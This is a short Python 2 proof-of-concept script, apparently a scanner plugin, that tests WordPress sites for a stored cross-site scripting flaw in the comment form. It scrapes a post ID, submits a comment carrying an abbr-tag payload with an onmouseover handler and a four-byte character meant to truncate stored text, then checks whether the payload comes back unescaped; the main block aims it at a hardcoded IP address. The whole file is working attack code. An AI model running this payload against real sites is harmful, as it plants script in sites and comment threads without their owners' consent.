# !/usr/bin/dev python
# -*- coding:utf-8 -*-

import re
import random
import string
import urllib

"""
refere:
http://www.beebeeto.com/pdb/poc-2015-0092/
"""


def assign(service, args):
    if service == 'wordpress':
        return True, args


def audit(args):
    target_url      = args
    verify_url      = target_url + 'wp-comments-post.php'
    rand_str        = lambda length: ''.join(random.sample(string.letters, length))
    pattern         = re.compile(r'post-(?P<post_id>[\d]+)')
    code, head, res, _, _   = curl.curl(target_url)
    match           = pattern.search(res)
    if code != 200:
        return False
    try:
        post_id     = match.group('post_id')
        post_url    = target_url + '?p=%s' % post_id
    except:
        return False
    flag            = rand_str(10)
    ttys            = '<abbr title="%s style=testvul onmouseover=alert(1)// \xD8\x34\xDF\x06">'
    payload = {
        'author': rand_str(10),
        'email': '%s@%s.com' % (rand_str(10), rand_str(3)),
        'url': 'http://www.testvul.com',
        'comment': ttys % flag,
        'comment_post_ID': post_id,
        'comment_parent': 0,
    }
    payload = urllib.urlencode(payload)
    code, head, res, _, _ =curl.curl('-L -d %s %s' % (payload, verify_url))
    if code == 200 and '<abbr title=&#8221;%s style=testvul onmouseover=alert(1)// </p>' % flag in res:
        security_hole(verify_url)


if __name__ == "__main__":
    from dummy import *
    audit(assign('wordpress', 'http://121.41.129.210:8080/xuge/')[1])
